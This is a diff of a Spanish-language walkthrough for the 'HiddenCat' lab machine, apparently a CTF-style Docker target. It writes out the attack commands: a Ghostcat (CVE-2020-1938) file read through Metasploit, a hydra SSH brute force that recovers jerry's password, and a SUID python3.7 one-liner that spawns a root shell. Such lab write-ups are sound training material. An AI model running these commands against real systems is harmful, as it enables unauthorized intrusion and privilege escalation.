@@ -4,10 +4,11 @@
 
 ### 📝 **Descripción:**
 
+HiddenCat es una máquina diseñada para poner a prueba habilidades básicas de reconocimiento, explotación de servicios vulnerables y escalada de privilegios. Utiliza tecnologías comunes como Apache Tomcat y está basada en Linux.
 
 ### 🎯 **Objetivo:**
 
-
+Obtener acceso inicial a través de un servicio vulnerable y escalar privilegios hasta obtener acceso como root.
 
 ![Logo](Imágenes/2025-05-17_13-08.png)
 
@@ -15,21 +16,20 @@
 
 ## 🖥️ **Despliegue de la máquina**
 
-Primero descargamos la máquina vulnerable `hiddencat.zip`, la descomprimimos con `unzip` y luego la desplegamos utilizando el script proporcionado:
+Descargamos el archivo `hiddencat.zip`, lo descomprimimos y desplegamos la máquina usando el script `auto_deploy.sh` proporcionado. Esto inicia la máquina vulnerable dentro de un contenedor Docker:
 
 ```bash
 unzip hiddencat.zip
 sudo bash auto_deploy.sh hiddencat.tar
 ```
 
-Esto levanta la máquina en un entorno Docker.
 ![Despliegue](Imágenes/Capturas.png)
 
 ---
 
 ## 📡 **Comprobación de conectividad**
 
-Hacemos un ping a la IP asignada (`172.17.0.3`) para confirmar que la máquina está activa:
+Verificamos la conexión con un simple `ping` a la IP asignada (172.17.0.3):
 
 ```bash
 ping -c1 172.17.0.3
@@ -41,54 +41,130 @@ ping -c1 172.17.0.3
 
 ## 🔍 **Escaneo de puertos**
 
-Ejecutamos un escaneo con `nmap` para detectar todos los puertos abiertos de la máquina:
+Ejecutamos un escaneo de puertos completo con `nmap`:
 
 ```bash
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.3 -oG allPorts.txt
 ```
 
-Se detectan los siguientes puertos abiertos:
+Puertos descubiertos:
 
-* **22 (SSH)**
-* **8009 (SSH)**
-* **8080 (HTTP)**
-  ![Puertos](Imágenes/Capturas_2.png)
+* **22/tcp** – SSH
+* **8009/tcp** – AJP13
+* **8080/tcp** – HTTP (Apache Tomcat)
 
-Posteriormente, con un script personalizado `extractPorts`, extraemos los puertos encontrados y los usamos para un escaneo más profundo:
+![Puertos](Imágenes/Capturas_2.png)
+
+Posteriormente, realizamos un escaneo más detallado sobre los puertos encontrados:
 
 ```bash
-nmap -sCV -p22,8080 172.17.0.3 -oN target.txt
+nmap -sCV -p22,8009,8080 172.17.0.3 -oN target.txt
 ```
 
 ![Servicios](Imágenes/Capturas_3.png)
 
 ---
-Entramos a la pagina alojada http://172.17.0.3:8080/ donde se puede la version que se esta usando Apache Tomcat/9.0.30 use searchsploit Tomcat para buscar alguna vulnerabilidad pero no encontre ninguna interesante asi que busque en internet y eocntre: https://www.exploit-db.com/exploits/49039 una vulnerabilidad Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)
+
+## 🌐 **Reconocimiento del servicio web**
+
+Accedemos al servicio en el puerto 8080 (`http://172.17.0.3:8080/`) y observamos que se trata de un servidor **Apache Tomcat/9.0.30**.
+
+Intentamos buscar vulnerabilidades en `searchsploit`, pero ninguna parecía aplicable. Sin embargo, investigando en línea encontramos la vulnerabilidad **Ghostcat (CVE-2020-1938)**, que afecta el conector AJP (puerto 8009).
+
+Referencia: [Exploit-DB 49039](https://www.exploit-db.com/exploits/49039)
+
 ![pagina](Imágenes/Capturas_4.png)
+![version](Imágenes/Capturas_5.png)
 
 ---
 
-![version](Imágenes/Capturas_5.png)
+## 🧰 **Explotación de Ghostcat con Metasploit**
 
-Para usar este script cree mkdir -p ~/.msf4/modules/auxiliary/scanner/http/ y nano ~/.msf4/modules/auxiliary/scanner/http/ghostcat.rb y en ghostcat.rb pegue todo el scrip lo guarde y lo cerre 
-Abri: msfconsole
-y recargue los modulos: reload_all
-despues use el modulo que cree: use auxiliary/scanner/http/ghostcat
-![version](Imágenes/Capturas_6.png)
-y se realizan las configuraciones:
+Para explotar Ghostcat, copiamos el código del exploit y lo colocamos en la ruta personalizada de Metasploit:
+
+```bash
+mkdir -p ~/.msf4/modules/auxiliary/scanner/http/
+nano ~/.msf4/modules/auxiliary/scanner/http/ghostcat.rb
+```
+
+Luego, iniciamos `msfconsole`, recargamos los módulos y ejecutamos el exploit:
+
+```bash
+msfconsole
+reload_all
+use auxiliary/scanner/http/ghostcat
+```
+
+Configuramos las siguientes opciones:
+
+```
 set RHOSTS 172.17.0.3
 set RPORT 8009
 set FILEPATH WEB-INF/web.xml
 run
-![inicio](Imágenes/Capturas_7.png)
-Al comenzar con el ataque se logra explotar Ghostcat (CVE-2020-1938) con éxito y descargar el archivo WEB-INF/web.xml del servidor donde se puede ver que existe un usuario Jerry.
-![usuario](Imágenes/Capturas_8.png)
-Notas: el parámetro FILEPATH sirve para especificar qué archivo quieres leer desde el servidor vulnerable, aprovechando el conector AJP de Apache Tomcat que lo espesificamos con set RPORT 8009 ya que gracias a nmap encontramos que lo esta usando.
+```
 
-Con el usuario descubirto use hydra -l jerry -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3 -t 4 para encontrar un contraseña para entrar al servicio de SSH y encontre las credenciales: 
-[22][ssh] host: 172.17.0.3   login: jerry   password: chocolate
-Con esta informacion entre al servicio SSH con exito
+![inicio](Imágenes/Capturas_6.png)
+
+La explotación fue exitosa y se obtuvo el archivo `WEB-INF/web.xml`, donde encontramos un usuario potencial: **jerry**.
+
+![usuario](Imágenes/Capturas_8.png)
+
+> 🔎 **Nota**:
+> El parámetro `FILEPATH` especifica el archivo que se desea leer en el servidor remoto. Aprovecha el conector AJP mal configurado (en el puerto 8009), permitiendo leer archivos sensibles fuera del contexto HTTP normal.
+
+---
+
+## 🔐 **Fuerza bruta SSH**
+
+Con el usuario `jerry` identificado, usamos `hydra` para realizar un ataque de fuerza bruta al servicio SSH (puerto 22):
+
+```bash
+hydra -l jerry -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3 -t 4
+```
+
+Credenciales obtenidas:
+
+* **Usuario:** jerry
+* **Contraseña:** chocolate
+
+Con estas credenciales, accedemos exitosamente por SSH:
+
+```bash
+ssh jerry@172.17.0.3
+```
+
 ![ssh](Imágenes/Capturas_9.png)
+
+---
+
+## 🧗 **Escalada de privilegios**
+
+Dentro del sistema, buscamos archivos con el bit SUID activo:
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+Descubrimos que `python3.7` tiene el bit SUID, lo que permite ejecutar código con privilegios elevados.
+
+Ejecutamos el siguiente comando para obtener una shell como root:
+
+```bash
+/usr/bin/./python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+
+Verificamos con `whoami` y confirmamos el acceso como **root**.
+
+![ssh](Imágenes/Capturas_10.png)
+
+---
+
+✅ **Resumen de escalada:**
+
+Se identificó `python3.7` con permisos SUID, lo que permitió ejecutar código como root. Al invocar una shell con privilegios usando Python, se logró acceso como usuario root y se completó la escalada de privilegios.
+
+---
 
 Se identificó python3.7 con SUID usando find / -perm -4000 2>/dev/null, lo que permite ejecutar código como root. Con /usr/bin/./python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")' se abrió una shell privilegiada. Finalmente, whoami confirmó el acceso como root. Así se logró la escalada local desde jerry a root.
 ![ssh](Imágenes/Capturas_10.png)
